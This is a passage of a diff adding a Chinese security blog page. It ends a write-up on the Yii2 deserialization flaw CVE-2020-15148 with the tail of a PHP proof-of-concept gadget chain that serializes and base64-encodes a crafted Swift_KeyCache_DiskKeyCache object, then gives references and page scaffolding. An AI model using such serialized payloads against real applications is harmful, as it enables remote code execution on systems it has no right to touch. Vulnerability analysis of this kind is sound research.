+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Swift_KeyCache_DiskKeyCache</span></span>&#123;
+        <span class="hljs-keyword">private</span> $keys = [];
+        <span class="hljs-keyword">private</span> $path;
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">        </span>&#123;
+            <span class="hljs-keyword">$this</span>-&gt;path = <span class="hljs-keyword">new</span> See;
+            <span class="hljs-keyword">$this</span>-&gt;keys = <span class="hljs-keyword">array</span>(
+                <span class="hljs-string">&quot;axin&quot;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;is&quot;</span>=&gt;<span class="hljs-string">&quot;handsome&quot;</span>)
+            );
+        &#125;
+    &#125;
+    <span class="hljs-comment">// 生成poc</span>
+    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> Swift_KeyCache_DiskKeyCache()));
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+<p>Description.php里也有一条，但原理一样，不再赘述。</p>
+<p>参考:</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU0ODg2MDA0NQ==&amp;mid=2247484726&amp;idx=1&amp;sn=5f268e5a840dbecad80224dc9a53e525&amp;chksm=fbb9fcd4ccce75c2d5c72ed67b50976b40b121abb495df70939895ed8c909040ce9ebe077913&amp;mpshare=1&amp;scene=23&amp;srcid=0921cI0QgoWweYnLNsGy7GgR&amp;sharer_sharetime=1600694482848&amp;sharer_shareid=b30d61744bd3c2a98fea51904fc6f025#rd">Yii2 反序列化（CVE-2020-15148）分析                </a></p>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6874149010832097294#heading-0">我是如何挖掘yii2的反序列化0day的</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/07/14/rce-0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Laravel Debug RCE（CVE-2021-3129）分析</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/07/11/web/">
+                        <span class="hidden-mobile">BJDCTF2020||EasySearch</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
